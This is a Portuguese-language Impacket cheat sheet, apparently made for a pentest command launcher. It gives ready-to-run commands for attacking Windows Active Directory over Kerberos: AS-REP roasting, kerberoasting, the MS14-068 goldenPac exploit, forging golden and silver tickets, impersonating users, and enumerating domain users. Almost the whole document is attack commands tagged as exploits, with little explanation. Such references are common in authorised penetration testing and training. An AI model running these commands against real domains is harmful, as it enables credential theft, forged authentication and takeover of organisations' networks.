# Impacket

% impacket, windows, kerberos, 88

## GetNPUsers Tenta obter um ticket TGT sem uma senha. (ASREPRoasting)
#plateform/linux #target/remoto #cat/ATTACK/EXPLOIT 
```
GetNPUsers.py <domain>/<user> -no-pass -request -format hashcat
```

## GetNPUsers - tenta listar e obter os TGTs dos usuarios que possuem a propriedade "Não exigir pré-autenticação Kerberos" ativada.  (ASREPRoasting)
#plateform/linux #target/remoto  #cat/ATTACK/EXPLOIT 
```
GetNPUsers.py -dc-ip <dc_ip> <domain>/ -usersfile <users_file> -format hashcat
```

## GetUSERSPN - Busca por Service Principal Names (SPNs -> Nome de Entidade de Serviço) que estão associados a uma conta normal de usuário (kerberoasting)
#plateform/linux #target/remoto  #cat/ATTACK/EXPLOIT 
```
GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<user>:<password>
```

## MS14-068 - goldenPac - CVE-2014-6324 (MS14-068) 
#plateform/linux #target/remoto  #cat/ATTACK/EXPLOIT
Um script para explorar a vulnerabilidade CVE-2014-6324 (MS14-068), caso o alvo seja vulnerável é possivel gerar um "Golden Ticket" sem saber a hash da senha do "krbtgt" burlando a verificação de assinatura do PAC. 
```
goldenPac.py -dc-ip <dc_ip> <domain>/<user>:'<password>'@<target>
```

## Ticketer - (golden ticket) - gera tickets TGT/TGS no formato ccache que podem ser futuramente convertidos para o formato kirbi. 
#plateform/linux #target/local  #cat/ATTACK/EXPLOIT
```
ticketer.py -nthash <nthash> -domain-sid <domain_sid> -domain <domain> <user>
```


## Ticketer - (silver ticket) - gera tickets TGS no formato ccache que pode ser futuramente convertidos para o formato kirbi.
#plateform/linux #target/local  #cat/ATTACK/EXPLOIT
```
ticketer.py -nthash <nthash> -domain-sid <domain_sid> -domain <domain> -spn <SPN> <user>
```

## TicketConverter - Converte arquivos kirbi (geralmente usados pelo mimikatz) em arquivos ccache usados pelo impacket.
#plateform/linux #target/local  #cat/UTILS
```
ticketConverter.py <ccache_ticket_file> <ticket_kirbi_file>
```

## Silver ticket - Personificar um usuário
#plateform/linux #target/remote  #cat/ATTACK/EXPLOIT 
```
getST.py -spn cifs/<target> <domain>/<netbios_name>\$ -impersonate <user>
```

## GetTGT - Solicita um TGT e salva o ticket como um arquivo "ccache" utilizando uma senha, hash ou aesKey
#plateform/linux #target/remote  #cat/UTILS
```
getTGT.py -dc-ip <dc_ip> -hashes <lm_hash>:<nt_hash> <domain>/<user>
```

## GetADUser - Coleta informações sobre os usuários do domínio e os endereços de e-mail correspondentes
#plateform/linux #target/remote  #cat/RECON 
```
GetADUsers.py -all <domain>/<user>:<password> -dc-ip <dc_ip>
```